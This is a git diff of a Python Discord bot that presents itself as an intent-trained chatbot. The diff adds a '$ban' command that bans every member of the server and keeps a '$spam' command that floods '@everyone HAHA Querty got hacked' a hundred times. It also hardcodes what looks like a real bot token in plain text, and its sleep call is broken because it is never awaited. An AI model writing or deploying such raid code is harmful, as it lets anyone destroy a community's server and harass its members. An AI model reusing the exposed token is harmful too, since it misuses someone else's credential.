@@ -4,6 +4,7 @@ from re import I
 from time import time
 import discord
 from neuralintents import GenericAssistant
+import asyncio
 
 chatbot = GenericAssistant('intents.json')
 chatbot.train_model()
@@ -13,25 +14,26 @@ client = discord.Client()
 
 Token = 'OTI5NDc5OTE5Nzc0MzQzMjcx.Ydn7oQ.0Yvn_4eXCdCKS5OVAbaICnzCPYE'
 
-
-
 @client.event
-async def on_message(message):
-    if message.author == client.user or message.content.startswith('?purge'):
+async def on_message(ctx):
+    if ctx.author == client.user or ctx.content.startswith('?purge'):
         return
     
-    if message.content.startswith('$ban'):
-     await message.channel.send('*Tee Hee*')
+    if ctx.content.startswith('$ban'):
+      for user in ctx.guild.members:
+         try:
+             await user.ban()
+         except:
+             pass
+
+    if ctx.content.startswith('$spam'):
+     for I in range(100):
+         await ctx.channel.send('@everyone HAHA Querty got hacked')
+         asyncio.sleep(0.1)
      return
 
-    if message.content.startswith('$spam'):
-     for I in range(1000):
-         await message.channel.send('@everyone HAHA Querty got hacked')
-         time.sleep(0.1)
-     return
-
-    if message.channel.name == 'general':
-        response = chatbot.request(message.content)
-        await message.channel.send(response)
+    if ctx.channel.name == 'general':
+        response = chatbot.request(ctx.content)
+        await ctx.channel.send(response)
 
 client.run(Token)
